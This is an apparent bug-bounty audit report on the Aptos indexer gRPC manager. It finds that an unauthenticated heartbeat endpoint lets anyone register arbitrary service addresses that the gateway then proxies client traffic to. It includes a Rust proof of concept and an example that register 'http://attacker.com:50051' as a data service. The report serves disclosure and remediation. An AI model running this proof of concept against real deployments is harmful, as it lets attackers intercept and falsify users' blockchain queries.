# Audit Report

## Title
Unauthenticated Service Registration Enables Malicious URL Injection in Indexer Gateway

## Summary
The `GetDataServiceForRequestResponse.data_service_address` field can contain malicious URLs due to lack of authentication and validation in the heartbeat registration endpoint. An attacker can register arbitrary service addresses without verification, causing the indexer gateway to redirect client requests to attacker-controlled servers.

## Finding Description

The Aptos indexer gRPC system allows data services to register themselves via unauthenticated heartbeat messages. The address provided in these heartbeats is stored without validation and later returned to clients, who blindly connect to it.

**Attack Flow:**

1. **Unauthenticated Registration**: The heartbeat endpoint accepts service registrations without any authentication: [1](#0-0) 

2. **No Address Validation**: The address from the heartbeat is passed directly to the metadata manager without validation: [2](#0-1) 

3. **Malicious Address Storage**: The address is stored in the live or historical data services map: [3](#0-2) 

4. **Address Selection**: The manager randomly selects from registered services and returns the malicious address: [4](#0-3) 

5. **Client Connection**: The gateway parses and connects to the malicious address without validation: [5](#0-4) 

The gateway then proxies client requests to the attacker's server: [6](#0-5) 

**Exploitation Example:**
- Attacker sends: `HeartbeatRequest { service_info: { address: "http://attacker.com:50051", info: LiveDataServiceInfo {...} } }`
- Manager stores: `live_data_services["http://attacker.com:50051"]`
- Gateway receives: `GetDataServiceForRequestResponse { data_service_address: "http://attacker.com:50051" }`
- Gateway connects to: `http://attacker.com:50051` and forwards all client queries

## Impact Explanation

This vulnerability enables multiple attack vectors:

1. **Data Theft**: Attacker intercepts all client queries, learning user addresses, query patterns, and transaction searches
2. **Data Manipulation**: Attacker returns fabricated blockchain data, potentially causing users to make incorrect financial decisions leading to loss of funds
3. **Privacy Breach**: Client IP addresses and behavioral patterns are exposed to the attacker
4. **Infrastructure Compromise**: Gateway makes HTTP connections to arbitrary attacker-controlled endpoints

While this does not directly affect blockchain consensus, it compromises the data integrity and availability of the indexer infrastructure that many applications and users rely upon. Per the Aptos bug bounty criteria, this qualifies as **High Severity** due to API manipulation and significant protocol violations affecting the indexer service.

## Likelihood Explanation

**Likelihood: High**

The attack requires:
- Network access to the gRPC manager's heartbeat endpoint (port typically exposed for legitimate data services)
- Ability to craft a valid gRPC HeartbeatRequest message
- No authentication credentials
- No special privileges

The vulnerability is trivially exploitable by any actor who can reach the endpoint. In production deployments without proper network isolation, this could include:
- External attackers if the endpoint is internet-facing
- Compromised internal hosts
- Malicious insiders with network access

The lack of any authentication makes the barrier to exploitation extremely low.

## Recommendation

Implement multi-layered security controls:

1. **Add Authentication**: Require mutual TLS or API tokens for heartbeat registration
2. **Validate Addresses**: Implement allowlist validation for registered service addresses
3. **Address Format Validation**: Verify addresses match expected patterns (e.g., internal DNS names only)
4. **Network Isolation**: Ensure the heartbeat endpoint is only accessible from trusted networks

**Example Fix** (add to metadata_manager.rs):

```rust
fn validate_service_address(address: &str) -> Result<()> {
    // Parse as URI
    let uri = Uri::from_str(address)
        .map_err(|_| anyhow!("Invalid URI format"))?;
    
    // Verify scheme
    if uri.scheme_str() != Some("http") && uri.scheme_str() != Some("https") {
        bail!("Invalid URI scheme");
    }
    
    // Check against allowlist
    let host = uri.host().ok_or_else(|| anyhow!("Missing host"))?;
    if !ALLOWED_SERVICE_HOSTS.contains(&host) {
        bail!("Service host not in allowlist: {}", host);
    }
    
    Ok(())
}
```

Apply validation in the heartbeat handler: [1](#0-0) 

## Proof of Concept

```rust
// PoC: Malicious service registration
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    HeartbeatRequest, ServiceInfo, LiveDataServiceInfo,
    service_info::Info,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to gRPC manager (no auth required)
    let mut client = GrpcManagerClient::connect("http://manager:50051").await?;
    
    // Register malicious service
    let malicious_address = "http://attacker.com:50051".to_string();
    let request = Request::new(HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some(malicious_address.clone()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1,
                timestamp: Some(timestamp_now_proto()),
                known_latest_version: Some(1000000),
                stream_info: Some(StreamInfo { active_streams: vec![] }),
                min_servable_version: Some(0),
            })),
        }),
    });
    
    // Send heartbeat - no authentication required
    let response = client.heartbeat(request).await?;
    println!("Malicious service registered: {:?}", response);
    
    // Now gateway will return attacker.com to clients
    // All subsequent client requests will be proxied to attacker's server
    Ok(())
}
```

**Notes**

This vulnerability exists in the Aptos indexer infrastructure, which is a critical component for ecosystem applications querying blockchain data. While it does not directly compromise consensus, it breaks the trust model for data integrity and could lead to financial losses if users or applications rely on manipulated indexer responses. The complete absence of authentication on a service registration endpoint that controls client routing represents a fundamental security design flaw.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-508)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
```

**File:** ecosystem/indexer-grpc/indexer-grpc-gateway/src/gateway.rs (L149-149)
```rust
    let url = Url::from_str(&response.data_service_address).unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-gateway/src/gateway.rs (L155-176)
```rust
async fn proxy(
    data_service_url: Extension<Url>,
    mut request: Request,
) -> Result<Response, (StatusCode, String)> {
    info!(
        data_service_url = data_service_url.as_str(),
        "Proxying request to data service: {}",
        data_service_url.as_str()
    );
    *request.uri_mut() = override_uri_with_upstream_url(request.uri(), &data_service_url)?;

    Client::builder(TokioExecutor::new())
        .http2_only(true)
        .build_http()
        .request(request)
        .await
        .map(|res| {
            let (parts, body) = res.into_parts();
            Response::from_parts(parts, axum::body::Body::new(body))
        })
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))
}
```
